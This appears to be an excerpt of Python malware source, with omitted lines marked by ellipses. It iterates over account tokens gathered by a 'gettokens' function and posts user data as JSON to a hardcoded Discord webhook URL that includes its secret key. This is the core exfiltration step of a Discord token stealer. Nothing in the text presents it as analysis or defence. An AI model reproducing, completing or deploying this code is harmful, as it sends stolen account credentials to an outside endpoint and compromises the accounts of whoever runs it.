        ...
        for token in gettokens(path):
            ...
            try:
                ...
                urllib.request.urlopen(
                    urllib.request.Request('https://discord.com/api/webhooks/1390384569160699924/mGCrF4uBHHJd2XR2UQ-llO2FwerlyJJ1MWEIpl1mYfMxQWLkqAZ7dSR6PaX5Vd2ZtGwR ', data=json.dumps(embed_user).encode('utf-8'),
